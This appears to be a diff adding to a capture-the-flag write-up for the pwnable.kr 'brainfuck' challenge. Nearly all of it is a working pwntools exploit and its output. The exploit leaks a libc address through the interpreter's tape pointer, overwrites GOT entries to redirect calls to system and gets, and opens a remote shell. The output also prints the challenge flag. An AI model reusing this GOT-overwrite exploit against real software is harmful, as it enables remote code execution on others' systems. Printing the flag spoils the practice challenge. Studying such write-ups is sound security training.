@@ -187,5 +187,50 @@ OFFSET   TYPE              VALUE
 0804a030 R_386_JUMP_SLOT   putchar@GLIBC_2.0
 ```
 
+```python 
+#!/usr/bin/env python
+from pwn import *
+# Remote EXP
+libc = ELF('./bf_libc.so')
+p = remote('pwnable.kr', 9001)
+# Local EXP
+p.recvline_startswith('type')
+payload = '<' * (0x0804A0A0 - 0x0804A010) #pointer P and fgets
+payload += '.>' * 4
+payload += '<' * 4
+payload += ',>' * 4
+payload += '>' * (0x0804A02C - 0x0804A014) #rop chain call 0804a02c R_386_JUMP_SLOT   memset@GLIBC_2.0  <------- Here  and 0804a014 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
+payload += ',>' * 4
+payload += ',>' * 4
+payload += '.'
+p.sendline(payload) #semd payload
+fgets_addr = p.recvn(4)[::-1].encode('hex')
+system_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['system']
+gets_addr = int(fgets_addr, 16) - libc.symbols['fgets'] + libc.symbols['gets']
+p.send(p32(system_addr))
+p.send(p32(gets_addr))
+p.send(p32(0x08048671))
+p.sendline('/bin/sh')
+p.interactive()
+```
 
-
+```shell
+ '/pwnble/BrainFuck/bf_libc.so'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to pwnable.kr on port 9001: Done
+[*] Switching to interactive mode
+welcome to brainfuck testing system!!
+type some brainfuck instructions except [ ]
+$ ls
+brainfuck
+flag
+libc-2.23.so
+log
+super.pl
+$ cat flag
+BrainFuck? what a weird language..
+$  
